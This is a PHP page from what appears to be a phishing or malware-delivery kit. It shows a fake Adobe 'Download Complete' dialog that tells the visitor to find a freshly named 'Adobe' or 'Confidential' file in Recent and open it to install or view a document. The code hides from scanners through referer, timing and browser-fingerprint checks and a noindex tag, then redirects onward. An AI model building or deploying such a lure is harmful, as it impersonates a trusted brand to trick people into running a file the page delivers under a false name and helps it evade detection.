<?php
require __DIR__ . '/../lib.php';

// Step 2: must arrive from index.php, >=4s after the token was minted
// (matches the 5s spinner), full Chrome fingerprint, same-origin referer.
gate_doc(['/index.php', '/download.php'], 4, false);

$name  = make_name();   // fresh Adobe/Confidential name for THIS visit
$kind  = name_kind($name);
$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);
$dest  = "complete.php?tk=" . $tk . "&n=" . $nameQ;
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Download Complete</title>
  <style>
    body {
      margin: 0; padding: 0;
      background-image: url('assets/screen.png');
      background-size: contain; background-position: center; background-repeat: no-repeat;
      height: 100vh; width: 100vw; background-color: #ffffff;
      font-family: Arial, sans-serif;
    }
    .modal-overlay {
      position: fixed; top: 0; left: 0; height: 100vh; width: 100vw;
      background-color: rgba(0,0,0,0.5);
      display: flex; justify-content: center; align-items: center; z-index: 1000;
    }
    .modal-content {
      background-color: white; padding: 30px; border-radius: 10px;
      width: 90%; max-width: 500px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      animation: modalFadeIn 0.3s ease-out; text-align: center;
    }
    @keyframes modalFadeIn { from { opacity:0; transform:translateY(-20px);} to { opacity:1; transform:translateY(0);} }
    .modal-header img { width: 100px; margin-bottom: 15px; }
    .continue-btn {
      background-color: #ED2224; color: white; border: none;
      padding: 12px 30px; border-radius: 4px; font-size: 16px;
      cursor: pointer; margin-top: 20px; width: 100%; max-width: 250px;
      transition: background-color 0.3s;
    }
    .continue-btn:hover { background-color: #c71b1d; }
    .info-text { color: #666; font-size: 12px; margin-top: 10px; }
    .spinner { display: none; margin-top: 20px; }
  </style>
</head>
<body>
  <div id="confirmationModal" class="modal-overlay">
    <div class="modal-content">
      <div class="modal-header">
        <img src="assets/adobe-logo-2017.png" alt="Adobe Logo">
        <h2>Download Complete</h2>
      </div>
      <p class="modal-text"><?php echo $kind === 'adobe' ? 'Your download is ready.' : "You've received a secured document."; ?></p>
      <p class="modal-subtext" style="padding-top:10px;">
        <?php echo $kind === 'adobe'
            ? 'Your installer has been saved to your device. Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to install.'
            : 'Your Document has been saved to your device. Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view your document.'; ?>
      </p>
      <p class="modal-subtext" style="padding-top:10px;">
        If your download did not start automatically, you can download the document again.
      </p>
      <button onclick="submitForm()" id="continueBtn" class="continue-btn">Download Document</button>
      <div id="spinner" class="spinner"><p>Loading...</p></div>
      <p class="info-text"></p>
    </div>
  </div>

  <script>
    function submitForm() {
      var btn = document.getElementById('continueBtn');
      var spinner = document.getElementById('spinner');
      btn.style.display = 'none';      // Hide button
      spinner.style.display = 'block'; // Show loading spinner
      setTimeout(function() {
        window.location.href = <?php echo json_encode($dest); ?>; // Redirect after 2 seconds
      }, 2000);
    }
  </script>
</body>
</html>
